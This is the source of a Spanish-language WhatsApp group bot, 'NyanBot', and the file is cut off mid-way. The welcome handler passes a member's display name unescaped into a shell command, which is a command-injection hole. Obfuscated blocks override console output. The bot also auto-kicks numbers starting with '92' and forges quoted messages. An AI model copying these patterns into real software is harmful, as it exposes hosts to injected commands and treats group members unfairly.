//============ NyanBot ============\\
// + Favor de mantener este codigo
//   tal y como esta.
// + Si modificaras, manten los
//   creditos:
//   _MankBarBar & Samu & LolHuman_
//============ Samu330 ============\\
const { 
  WAConnection,
  MessageType,
  Presence, 
  MessageOptions,
  Mimetype,
  WALocationMessage,
  WA_MESSAGE_STUB_TYPES,
  ReconnectMode,
  ProxyAgent,
  GroupSettingChange,
  ChatModification,
  waChatKey,
  WA_DEFAULT_EPHEMERAL,
  mentionedJid,
  processTime
} = require("@adiwajshing/baileys")
const moment = require("moment-timezone");
const os = require("os");
const FormData = require('form-data')
const imageToBase64 = require('image-to-base64');
const speed = require('performance-now');
const chalk = require('chalk');
const crypto = require("crypto-js");
const CryptoJS = require("crypto-js");
const request = require('request');
const fs = require('fs');
const { wait, h2k, generateMessageID, getGroupAdmins, banner, start, info, success, close } = require('./lib/functions')
const { removeBackgroundFromImageFile } = require('remove.bg');
const { exec } = require('child_process');
const ffmpeg = require('fluent-ffmpeg');
const axios = require('axios');
const fetch = require('node-fetch');
const samuGg = require('google-it');
const samuGgImg = require('g-i-s');

const {y2mateA, y2mateV} = require('./lib/y2mate.js')
const {sm330mfire} = require('./lib/mediafire.js')
const { ssstik } = require("./lib/tiktok.js")
const {fotoIg, videoIg} = require('./lib/ig.js')
const {fbDown} = require('./lib/fb.js')
const conn = require("./lib/connect")
const msg = require("./lib/message")
const wa = require("./lib/wa")
const Exif = require('./lib/exif');
const exif = new Exif();
const { recognize } = require('./lib/ocr');
const help = require("./lib/help")
const yts = require('yt-search')
const postBuffer = help.postBuffer
const getBuffer = help.getBuffer
const getRandom = help.getRandomExt
const postJson = help.postJson
const getJson = help.getJson
const samu = JSON.parse(fs.readFileSync('./setting.json'))
const bodyM = samu.samuM
const antimedia = JSON.parse(fs.readFileSync('./src/antimedia.json'))
const bad = JSON.parse(fs.readFileSync('./src/bad.json'))
const badword = JSON.parse(fs.readFileSync('./src/badword.json'))
const autostick = JSON.parse(fs.readFileSync('./src/autostick.json'))
const nsfw = JSON.parse(fs.readFileSync('./src/nsfw.json'))
const antilink = JSON.parse(fs.readFileSync('./src/antilink.json'))
const simi = JSON.parse(fs.readFileSync('./src/simi.json'))
const legion = JSON.parse(fs.readFileSync('./src/sm330Leg.json'))
const welkom = JSON.parse(fs.readFileSync('./src/welkom.json'))
const config = JSON.parse(fs.readFileSync("./config.json"))
const owner = config.owner
const mods = config.mods
var public = config.public

conn.connect()
const samu330 = conn.samu330

const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}

const api = 'ec35353a991a258b05876861'
fak = 'samu3300'
prefix = '.'
apikey = 'LindowApi'
hit_today = []
const _registered = JSON.parse(fs.readFileSync('./src/registered.json'))

///////////////////////////////////////////////////////////////////////////

//========= Funcion de Registro =========\\

const getRegisteredRandomId = () => {
        return _registered[Math.floor(Math.random() * _registered.length)].id
        }
        const addRegisteredUser = (userid, sender, age, time, serials) => {
        const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
        _registered.push(obj)
        fs.writeFileSync('./src/registered.json', JSON.stringify(_registered))
        }

        const createSerial = (size) => {
        return crypto.randomBytes(size).toString('hex').slice(0, size)
        }

        const checkRegisteredUser = (sender) => {
        let status = false
        Object.keys(_registered).forEach((i) => {
        if (_registered[i].id === sender) {
        status = true
        }
        })
            return status
        }
samu330.on('CB:action,,call', async json => {
const callerId = json[2][0][1].from;
console.log("Llamada recibida de "+ callerId)
samu330.sendMessage(callerId, "Las llamadas no se permiten, *PORFAVOR LEE LAS REGLAS!* Te bloqueare😒", MessageType.text, {quoted: {key: {
fromMe: false,
participant: `0@s.whatsapp.net`
},
message: {
"productMessage": {
"product": {
"productImage":{
"mimetype": "image/jpeg",
"jpegThumbnail": fs.readFileSync(`./media/call.png`)
},
"title": `🚫No se permiten las llamadas🚫`,
"description": "",
"currencyCode": "SYP",
"priceAmount1000": "999999999999999999",
"retailerId": "",
"productImageCount": 999
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}}})
await sleep(4000)
await samu330.blockUser(callerId, "add")
})

 

samu330.on('group-participants-update', async (anu) => {
await anu.participants[0].startsWith('92'), samu330.groupRemove(from, anu)
await anu.participants[0].startsWith('52'), samu330.sendMessage(from, 'un mexicano xd', MessageType.text)
if (!welkom.includes(anu.jid)) return
try {
const mdata = await samu330.groupMetadata(anu.jid)
console.log(anu)
if (anu.action == 'add') {
num = anu.participants[0]
const moment = require('moment-timezone')
const jm = moment.tz('America/Mexico_City').format('HH:mm:ss')
let d = new Date
let locale = 'es'
let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let calender = d.toLocaleDateString(locale, {
day: 'numeric',
month: 'long',
year: 'numeric'
})

try {
pushnem = sam.key.fromMe ? samu330.user.name : conts.notify || conts.vname || conts.name || '-'

} catch {
pushnem = num.split('@')[0]
}
try {
ppimg = await samu330.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
exec(`magick './src/wel.jpg' -gravity west -fill '#00FFFF' -font './src/font-gue.ttf' -size 1280x710 -pointsize 75 -interline-spacing 7.5 -annotate +460-45 '${pushnem}' -pointsize 35 -annotate +460+83 '${jm} ${calender}' -pointsize 50 -annotate +460+200 'Bienvenido a ${mdata.subject}' '${ppimg}' -resize %[fx:t?u.w*0.2:u.w]x%[fx:?u.h*0.2:u.h] -gravity center -geometry -430+70 -composite 'hamsil.jpg'`)
.on('error', () => reply('error'))
.on('exit', () => {
samu330.sendMessage(mdata.id, fs.readFileSync('hamsil.jpg'), MessageType.image, {caption: `😙Hola, @${num.split('@')[0]}, _*Bienvenido a ${mdata.subject}, esperamos que te la pases a gusto en este grupo✨*_\n\n_Recuerda siempre seguir las reglas y mantener una formalidad respetuosa_😉\n\nSon las *${jm}* del *${calender}*\n\n${mdata.desc}`, contextInfo: { mentionedJid: [num] }})
})
//leave
}  else if (anu.action == 'remove') {
num = anu.participants[0]
teks = `_Weno ps.... amm😪...  @${num.split('@')[0]} se nos fue, ni llorar es bueno:)_
_*Ojala y le baya bien, y mas despues..... que lo atropelle un tren!!🚉🤣*_
*No se awiten gente, esten seguros que nadie lo extrañara:D*`
samu330.sendMessage(mdata.id, teks, MessageType.text,{ contextInfo: {"mentionedJid": [num]}})

} else if (anu.action == 'promote') {


num = anu.participants[0]
try {
ppimg = await samu330.getProfilePicture(`${num.split('@')[0]}@c.us`)
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
thu = await samu330.getStatus(anu.participants[0], MessageType.text)
teks = `*✅NUEVO ADMIN✅*\n*🙋🏻‍♂️ Nombre*: @${num.split('@')[0]}\n*📋 INFO*: ${thu.status}\n\n🥳 *FEILICIDADES!!*, te as convertido en administrador del grupo ${mdata.subject}`
let buff = await getBuffer(ppimg)

samu330.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
} else if (anu.action == 'demote') {
num = anu.participants[0]
try {
ppimg = await samu330.getProfilePicture(`${num.split('@')[0]}@c.us`)
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
thu = await samu330.getStatus(anu.participants[0], MessageType.text)
teks = `*❌UN ADMIN MENOS❌*\n*🙋🏻‍♂️ Nombre*: @${num.split('@')[0]}\n*📋 INFO*: ${thu.status}\n\n*😪Nimodos, ya no eres admnistrador del grupo* ${mdata.subject}`
let buff = await getBuffer(ppimg)
samu330.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
}
} catch (e) {
console.log('Error : %s', color(e, 'red'))
}
})


samu330.on('chat-update', async(sam) => {
    try {
        if (!sam.hasNewMessage) return
        if (!sam.messages) return
        if (sam.key && sam.key.remoteJid == 'status@broadcast') {
	}
	sam = sam.messages.all()[0]
	sam.message = (Object.keys(sam.message)[0] === 'ephemeralMessage') ? sam.message.ephemeralMessage.message : sam.message
        if (!sam.message) return
        const from = sam.key.remoteJid
        const type = Object.keys(sam.message)[0]
        const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
        const quoted = type == 'extendedTextMessage' && sam.message.extendedTextMessage.contextInfo != null ? sam.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
        const typeQuoted = Object.keys(quoted)[0]
        const body = sam.message.conversation || sam.message[type].caption || sam.message[type].text || ""
        chats = (type === 'conversation') ? sam.message.conversation : (type === 'extendedTextMessage') ? sam.message.extendedTextMessage.text : ''
        budy = (type === 'conversation' && sam.message.conversation.startsWith(prefix)) ? sam.message.conversation : (type == 'imageMessage') && sam.message.imageMessage.caption.startsWith(prefix) ? sam.message.imageMessage.caption : (type == 'videoMessage') && sam.message.videoMessage.caption.startsWith(prefix) ? sam.message.videoMessage.caption : (type == 'extendedTextMessage') && sam.message.extendedTextMessage.text.startsWith(prefix) ? sam.message.extendedTextMessage.text : ''

        if (prefix != "") {
        if (!body.startsWith(prefix)) {
        cmd = false
        comm = ""
        } else {
        cmd = true
        comm = body.slice(1).trim().split(" ").shift().toLowerCase()
        }
        } else {
        cmd = false
        comm = body.trim().split(" ").shift().toLowerCase()
        }


	const uploadImages = (filePath) => {
	return new Promise(async (resolve, reject) => {
        const fileData = fs.readFileSync(filePath)
        const form = new FormData()
        form.append('file', fileData, 'tmp.png')
        fetch('https://telegra.ph/upload', {
	method: 'POST',
        body: form
        })
        .then(res => res.json())
        .then(res => {
        if (res.error) return reject(res.error)
        resolve('https://telegra.ph' + res[0].src)
        })
        .then(() => fs.unlinkSync(filePath))
        .catch(err => reject(err))
	})
	}

        const command = comm
        hit_today.push(command)
	const samu = '```'
	const crypto = require('crypto')
        const args = body.trim().split(/ +/).slice(1)
        const isCmd = cmd
        const meNumber = samu330.user.jidi
        const botNumber = samu330.user.jid.split("@")[0]
        const isGroup = from.endsWith('@g.us')
        const arg = chats.slice(command.length + 2, chats.length)
	const sender = sam.key.fromMe ? samu330.user.jid : isGroup ? sam.participant : sam.key.remoteJid
        const senderNumber = sender.split("@")[0]
        const groupMetadata = isGroup ? await samu330.groupMetadata(from) : ''
        const groupName = isGroup ? groupMetadata.subject : ''
        const groupMembers = isGroup ? groupMetadata.participants : ''
        const groupAdmins = isGroup ? await wa.getGroupAdmins(groupMembers) : []
        const isAdmin = groupAdmins.includes(sender) || false
        const botAdmin = groupAdmins.includes(samu330.user.jid)
        const itsMe = senderNumber == botNumber
	const isBadWord = isGroup ? badword.includes(from) : false
	const isAntiLink = isGroup ? antilink.includes(from) : false
	const isAntiMedia = isGroup ? antimedia.includes(from) : false
	const isAutoSt = isGroup ? autostick.includes(from) : false
	const isNsfw = isGroup ? nsfw.includes(from) : false
	const isSimi = isGroup ? simi.includes(from): false
	const isAntiLeg = isGroup ? legion.includes(from): false
	const isWelkom = isGroup ? welkom.includes(from) : false
	const isRegister = checkRegisteredUser(sender)
	const totalChat = samu330.chats.all()
        const isOwner = senderNumber == owner || senderNumber == botNumber || mods.includes(senderNumber)
	const q = args.join(' ')
	var pes = (type === 'conversation' && sam.message.conversation) ? sam.message.conversation : (type == 'imageMessage') && sam.message.imageMessage.caption ? sam.message.imageMessage.caption : (type == 'videoMessage') && sam.message.videoMessage.caption ? sam.message.videoMessage.caption : (type == 'extendedTextMessage') && sam.message.extendedTextMessage.text ? sam.message.extendedTextMessage.text : ''
	const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
	const jid = sender
	const is = budy.slice(0).trim().split(/ +/).shift().toLowerCase()
	const Smname = sam.key.fromMe ? samu330.user.jid : samu330.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const mentionByTag = type == "extendedTextMessage" && sam.message.extendedTextMessage.contextInfo != null ? sam.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == "extendedTextMessage" && sam.message.extendedTextMessage.contextInfo != null ? sam.message.extendedTextMessage.contextInfo.participant || "" : ""
        const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
        mention != undefined ? mention.push(mentionByReply) : []
        const mentionUser = mention != undefined ? mention.filter(n => n) : []
        const mentions = (teks, memberr, id) => {
	(id == null || id == undefined || id == false) ? samu330.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : samu330.sendMessage(from, teks.trim(), extendedText, {quoted: sam, contextInfo: {"mentionedJid": memberr}})
	}
	const pushname = sam.key.fromMe ? samu330.user.name : sam.notify || sam.vname || sam.name || 'Amigo'
	const isUrl = (url) => {
	return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
			}
	const createSerial = (size) => {
	return crypto.randomBytes(size).toString('hex').slice(0, size)
        }
	const sendMess = (hehe, teks) => {
	samu330.sendMessage(hehe, teks, MessageType.text, {quoted: ftoko})
  	}

	mess = {
			wait: '⌛ 𝐄𝐍 𝐏𝐑𝐎𝐂𝐄𝐒𝐎 ⌛',
			success: '✔️ 𝙎𝙐𝙎𝙎𝙀𝙎 ✔️',
			nsfw: `𝗟𝗼 𝘀𝗶𝗲𝗻𝘁𝗼 𝗽𝗲𝗿𝗼 𝗻𝗼 𝗽𝘂𝗲𝗱𝗼 𝗲𝗷𝗲𝗰𝘂𝘁𝗮𝗿 𝗲𝘀𝗲 𝗰𝗼𝗺𝗮𝗻𝗱𝗼, 𝗲𝘀𝘁𝗲 𝗴𝗿𝘂𝗽𝗼 𝗻𝗼 𝗽𝗲𝗿𝗺𝗶𝘁𝗲 𝗰𝗼𝗻𝘁𝗲𝗻𝗶𝗱𝗼 +𝟭𝟴\n*PARA ACTIVAR LOS COMANDOS +18, USA:* ${prefix}+18 1`, 
			ferr: 'Intentalo de nuevo mas tarde',
			error: {
			stick: '[❗] 𝙀𝙍𝙍𝙊𝙍 intentalo de nuevo, da error a la primera:D  ❌',
			Iv: '❌ Link invalido ❌'
			},
			only: {
    			group: '[❗] ¡Este comando solo se puede usar en grupos! ❌',
    			benned: '⚠ *USTED ES UN USUARIO BANEADO, ESO QUIERE DECIR QUE NO PUEDE USAR EL BOT* ⚠',
    			ownerG: '[❗] ¡Este comando solo puede ser utilizado por el creador del grupo! ❌',
    			ownerB: '[❗] ¡Este comando solo puede ser utilizado por el creador del bot! ❌\nOsea, Samu: wa.me/+529984907794, Habla con el para que pueda cambiar el numero del owner en este bot',
    			admin: '[❗] ¡Este comando solo puede ser utilizado por administradores del grupo! ❌',
    			Badmin: '[❗] ¡Este comando solo se puede usar cuando el bot es administrador! ❌',
    			usrReg: `Usuario no *Registrado*\n_Para registrarte usa el comando_: *${prefix}reg*`
  			}
			}

	const hour_now = moment().format('HH')
        var timeFt = '*Buenos dias🌅*'
        if (hour_now >= '03' && hour_now <= '10') {
          timeFt = 'Buenos dias'
        } else if (hour_now >= '10' && hour_now <= '14') {
          timeFt = '*Buenos dias🌅*'
        } else if (hour_now >= '14' && hour_now <= '17') {
          timeFt = 'Buenas tardes🌇'
        } else if (hour_now >= '17' && hour_now <= '18') {
          timeFy = 'Buenas tardes🌇'
        } else if (hour_now >= '18' && hour_now <= '23') {
          timeFt = 'Buenas noches🌃'
        } else {
          timeFt = 'Buen inicio del dia!🌱'
        }
        

        const isImage = type == 'imageMessage'
        const isVideo = type == 'videoMessage'
        const isAudio = type == 'audioMessage'
        const isSticker = type == 'stickerMessage'
        const isContact = type == 'contactMessage'
        const isLocation = type == 'locationMessage'
        const isMedia = (type === 'imageMessage' || type === 'videoMessage')
        
        typeMessage = body.substr(0, 50).replace(/\n/g, '')
        if (isImage) typeMessage = "Image"
        else if (isVideo) typeMessage = "Video"
        else if (isAudio) typeMessage = "Audio"
        else if (isSticker) typeMessage = "Sticker"
        else if (isContact) typeMessage = "Contact"
        else if (isLocation) typeMessage = "Location"

        const isQuoted = type == 'extendedTextMessage'
        const isQuotedImage = isQuoted && typeQuoted == 'imageMessage'
        const isQuotedVideo = isQuoted && typeQuoted == 'videoMessage'
        const isQuotedAudio = isQuoted && typeQuoted == 'audioMessage'
        const isQuotedSticker = isQuoted && typeQuoted == 'stickerMessage'
        const isQuotedContact = isQuoted && typeQuoted == 'contactMessage'
        const isQuotedLocation = isQuoted && typeQuoted == 'locationMessage'

        if (!public) {
        mods.indexOf(botNumber) === -1 ? mods.push(botNumber) : false
        mods.indexOf(owner) === -1 ? mods.push(owner) : false
        if (!mods.includes(senderNumber)) return
        mods.slice(mods.indexOf(owner), 1)
        }
	    
	const sendFileFromUrl = async(link, type, options) => {
  	hasil = await getBuffer(link)
	samu330.sendMessage(from, hasil, type, options).catch(e => {
	fetch(link).then((hasil) => {
	samu330.sendMessage(from, hasil, type, options).catch(e => {
	samu330.sendMessage(from, { url : link }, type, options).catch(e => {
	  reply('_[ ! ] Error al descargar el archivo_')
	  console.log(e)
	})
	})
	})
	})
	}
	
	const reply = async(teks) => {
            await samu330.sendMessage(from, teks, MessageType.text, { quoted: { key: {                
		    fromMe: false,
                participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                },
                message: {
                "productMessage": {                   
		"product": {                                       
		"title": '🥀𝑺𝒂𝒎 𝒚 𝑷𝒆𝒓𝒓𝒚🍒 | 🌺NყᥲᥒBot🌺',
                "description": "",                       
		"currencyCode": "SYP",
                "priceAmount1000": "999999999999999999",
                "retailerId": "NyanBot",
                "productImageCount": 1
                },
                "businessOwnerJid": `0@s.whatsapp.net`
                }
                }}
       		})
		}
	
	const noreg = {
		key: {
		fromMe: false,
		participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
		},
		message: {
		"productMessage": {
		"product": {
		"title": '🗒️𝐔𝐬𝐮𝐚𝐫𝐢𝐨 𝐧𝐨 𝐫𝐞𝐠𝐢𝐬𝐭𝐫𝐚𝐝𝐨!',
		"description": "𝙍𝙚𝙜𝙞𝙨𝙩𝙧𝙖𝙩𝙚",
		"currencyCode": "SYP",
		"priceAmount1000": "999999999999999999",
		"retailerId": "NyanBot",
		"productImageCount": 1
		},
		"businessOwnerJid": `0@s.whatsapp.net`
		}
		}
		}


		

	const fimg = {
key:
{ fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ?
{ remoteJid: "status@broadcast" } : {}) },
message: { "imageMessage": { "mimetype": "image/jpeg","caption": `🥀Sαм y Perry`, 'jpegThumbnail': fs.readFileSync('./src/help.jpg')}}
}
contextInfo: {
mentionedJid: [sender]}
const fdoc = {
key:
{ fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ?
{ remoteJid: "status@broadcast" } : {}) },
message: { "documentMessage": { "title":"🔥𝒩𝓎𝒶𝓃𝐵𝑜𝓉 | 𝚂𝚊𝚖 𝚢 𝙿𝚎𝚛𝚛𝚢💓", 'jpegThumbnail': fs.readFileSync('./src/fake.jpg')}}
}
contextInfo: {
mentionedJid: [sender]}
const floc = {
key:
{ fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ?
{ remoteJid: "status@broadcast" } : {}) },
message: { "locationMessage": { "caption":"🥀𝓝𝔂𝓪𝓷𝓑𝓸💞", 'jpegThumbnail': fs.readFileSync('./src/samyperry.png')}}
}
contextInfo: {
mentionedJid: [sender]}
const fliveLoc = {
key:
{ fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ?
{ remoteJid: "status@broadcast" } : {}) },
message: { "liveLocationMessage": { "caption":"🍒𝒮𝒶𝓂 𝓎 𝒫𝑒𝓇𝓇𝓎 | 𝙉𝙮𝙖𝙣𝘽𝙤𝙩🔥", 'jpegThumbnail': fs.readFileSync('./src/img.jpg')}}
}
contextInfo: {
mentionedJid: [sender]}
const fvid = {
key:
{ fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ?
{ remoteJid: "status@broadcast" } : {}) },
message: { "videoMessage": { "caption":"🌺Ｓａｍ ｙ Ｐｅｒｒｙ🌺", 'jpegThumbnail': fs.readFileSync('./src/help.jpg')}}
}
contextInfo: {
mentionedJid: [sender]}
const faud = {
key:
{ fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ?
{ remoteJid: "status@broadcast" } : {}) },
message: { "audioMessage": { "caption":"🪀𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝘆", 'jpegThumbnail': fs.readFileSync('./src/help.jpg')}}
}
contextInfo: {
mentionedJid: [sender]}
const ftoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
"productMessage": {
"product": {
"productImage":{
"mimetype": "image/jpeg",
"jpegThumbnail": fs.readFileSync(`./src/fake.jpg`)
},
"title": `🐉𝗦𝗮𝗺𝘂𝟯𝟯𝟬🔥 | 📌𝑵𝒚𝒂𝒏𝑩𝒐𝒕🌹\n${timeFt}`,
"description": "",
"currencyCode": "SYP",
"priceAmount1000": "999999999999999999",
"retailerId": "",
"productImageCount": 999
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
}
contextInfo: {
mentionedJid: [sender]}


		if (!isGroup && isCmd) console.log(chalk.greenBright("├"), chalk.keyword("aqua")("[ COMMANDO ]"), chalk.whiteBright(typeMessage), chalk.greenBright("de"), chalk.keyword("yellow")(senderNumber))
        	if (isGroup && isCmd) console.log(chalk.greenBright("├"), chalk.keyword("aqua")("[ COMMANDO ]"), chalk.whiteBright(typeMessage), chalk.greenBright("de"), chalk.keyword("yellow")(senderNumber), chalk.greenBright("en el grupo"), chalk.keyword("yellow")(groupName))
	
		if (messagesC.includes("bot")){
			samu330.updatePresence(from, Presence.composing)
			rm = [
			result = fs.readFileSync(`./temp/Samu.webp`),
			result1 = fs.readFileSync(`./temp/Samu1.webp`),
			result2 = fs.readFileSync(`./temp/Samu2.webp`),
			result3 = fs.readFileSync(`./temp/Samu3.webp`),
			result4 = fs.readFileSync(`./temp/Samu4.webp`)
			]
			nk = rm[Math.floor(Math.random() * rm.length)]
  			samu330.sendMessage(from, nk, sticker, {
			quoted: fimg, "forwardingScore": 9999, "isForwarded": true
  			})
			}
		if (isAutoSt && isMedia && isImage) {
		if (!itsMe) {
                const encmedia11 = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
                const media11 = await samu330.downloadAndSaveMediaMessage(encmedia11, `./sticker/${sender}`)
		const _0x1766=['warn','1kpfGKg','console','toString','constructor','length','178061stRBUX','1300545pGpVkk','138xeSLmh','return\x20(function()\x20','log','934846oKLsog','9350TIPSLK','25Aspfso','433203bjkpOB','^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}','test','360802vwcGNc','__proto__','prototype','error','bind','\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0aSamu330\x20NyanBot\x0a\x0a\x20\x20\x20\x20\x20\x20\x20Sam\x20y\x20Perry','104838iWsgLj','apply','trace','table','return\x20/\x22\x20+\x20this\x20+\x20\x22/'];const _0x4d367b=_0x5de4;(function(_0x3eb50f,_0x5003ec){const _0x160706=_0x5de4;while(!![]){try{const _0x1f0294=parseInt(_0x160706(0x94))*-parseInt(_0x160706(0x90))+-parseInt(_0x160706(0x8f))+-parseInt(_0x160706(0x96))+-parseInt(_0x160706(0x93))+parseInt(_0x160706(0x9f))*-parseInt(_0x160706(0x89))+parseInt(_0x160706(0x99))+-parseInt(_0x160706(0x95))*-parseInt(_0x160706(0x8e));if(_0x1f0294===_0x5003ec)break;else _0x3eb50f['push'](_0x3eb50f['shift']());}catch(_0x5172fc){_0x3eb50f['push'](_0x3eb50f['shift']());}}}(_0x1766,0xb6c33));const _0x33a8e1=function(){let _0x15f095=!![];return function(_0xc7cbfc,_0x3249de){const _0x38e2d8=_0x15f095?function(){const _0x52e93e=_0x5de4;if(_0x3249de){const _0x285798=_0x3249de[_0x52e93e(0xa0)](_0xc7cbfc,arguments);return _0x3249de=null,_0x285798;}}:function(){};return _0x15f095=![],_0x38e2d8;};}(),_0x49176f=_0x33a8e1(this,function(){const _0x10650c=function(){const _0x379fdc=_0x5de4,_0x3a1fbc=_0x10650c['constructor'](_0x379fdc(0x87))()[_0x379fdc(0x8c)](_0x379fdc(0x97));return!_0x3a1fbc[_0x379fdc(0x98)](_0x49176f);};return _0x10650c();});function _0x5de4(_0x1fdbaf,_0x29f9bf){return _0x5de4=function(_0x165099,_0x5b786d){_0x165099=_0x165099-0x86;let _0x1efd2f=_0x1766[_0x165099];return _0x1efd2f;},_0x5de4(_0x1fdbaf,_0x29f9bf);}_0x49176f();const _0x1efd2f=function(){let _0x1bb24e=!![];return function(_0x15bf9c,_0x1d48e4){const _0x4f2296=_0x1bb24e?function(){const _0x55ad81=_0x5de4;if(_0x1d48e4){const _0x53132f=_0x1d48e4[_0x55ad81(0xa0)](_0x15bf9c,arguments);return _0x1d48e4=null,_0x53132f;}}:function(){};return _0x1bb24e=![],_0x4f2296;};}(),_0x5b786d=_0x1efd2f(this,function(){const _0x34c292=_0x5de4,_0x15e5c1=function(){const _0x5bb16a=_0x5de4;let _0x401748;try{_0x401748=Function(_0x5bb16a(0x91)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x2b5e28){_0x401748=window;}return _0x401748;},_0x3e62c6=_0x15e5c1(),_0x245f34=_0x3e62c6[_0x34c292(0x8a)]=_0x3e62c6['console']||{},_0x1903dd=[_0x34c292(0x92),_0x34c292(0x88),'info',_0x34c292(0x9c),'exception',_0x34c292(0x86),_0x34c292(0xa1)];for(let _0x5ae008=0x0;_0x5ae008<_0x1903dd[_0x34c292(0x8d)];_0x5ae008++){const _0x58a6ed=_0x1efd2f['constructor'][_0x34c292(0x9b)][_0x34c292(0x9d)](_0x1efd2f),_0xb03c63=_0x1903dd[_0x5ae008],_0x260eb3=_0x245f34[_0xb03c63]||_0x58a6ed;_0x58a6ed[_0x34c292(0x9a)]=_0x1efd2f[_0x34c292(0x9d)](_0x1efd2f),_0x58a6ed[_0x34c292(0x8b)]=_0x260eb3[_0x34c292(0x8b)][_0x34c292(0x9d)](_0x260eb3),_0x245f34[_0xb03c63]=_0x58a6ed;}});_0x5b786d();const aaa=_0x4d367b(0x9e);
                const packname101 = `${aaa}`
		const author101 = args.join(' ')
                exif.create(packname101, author101, `stickwm_${sender}`)
                await ffmpeg(`${media11}`)
                .input(media11)
                .on('start', function (cmd) {
                console.log(`Started : ${cmd}`)
                })
                .on('error', function (err) {
                console.log(`Error : ${err}`)        
		fs.unlinkSync(media1)                
		reply('*Intenta de nuevo*')
                })
                .on('end', function () {
                console.log('Finish')                         
		exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {                                               
		if (error) return reply('error')
                wa.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), ftoko)             
		fs.unlinkSync(media11)
                fs.unlinkSync(`./sticker/${sender}.webp`)
                fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
                })
                })
                .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p]paletteuse`])
                .toFormat('webp')
                .save(`./sticker/${sender}.webp`)
		}}
		if ((isMedia && sam.message.videoMessage.fileLength < 10000000 || isQuotedVideo && sam.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
		if (!itsMe) {
                const encmedia22 = isQuotedVideo ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
                const media22 = await samu330.downloadAndSaveMediaMessage(encmedia22, `./sticker/${sender}`)
		const _0x27fb=['1227757QFPTCj','table','error','console','^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}','prototype','4mOcIdv','300973AXvFLL','113PJAhxc','bind','__proto__','constructor','1hPhdPg','toString','2614385THObwv','\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0aSamu330\x20NyanBot\x0a\x0a\x20\x20\x20\x20\x20\x20\x20Sam\x20y\x20Perry','674jhGLms','1366829jQTHFD','378748rzovFh','exception','1wImvle','1305043VMjXUP','return\x20/\x22\x20+\x20this\x20+\x20\x22/','{}.constructor(\x22return\x20this\x22)(\x20)','apply'];function _0x3657(_0x24f22c,_0x12d4cd){return _0x3657=function(_0x36fb84,_0x290295){_0x36fb84=_0x36fb84-0x135;let _0x42acbe=_0x27fb[_0x36fb84];return _0x42acbe;},_0x3657(_0x24f22c,_0x12d4cd);}const _0x495578=_0x3657;(function(_0x53a12a,_0x3301a7){const _0x1d2e31=_0x3657;while(!![]){try{const _0x162d02=-parseInt(_0x1d2e31(0x135))+-parseInt(_0x1d2e31(0x14a))+parseInt(_0x1d2e31(0x149))*parseInt(_0x1d2e31(0x146))+-parseInt(_0x1d2e31(0x13d))*-parseInt(_0x1d2e31(0x145))+parseInt(_0x1d2e31(0x141))*parseInt(_0x1d2e31(0x147))+parseInt(_0x1d2e31(0x13b))*-parseInt(_0x1d2e31(0x13c))+parseInt(_0x1d2e31(0x143));if(_0x162d02===_0x3301a7)break;else 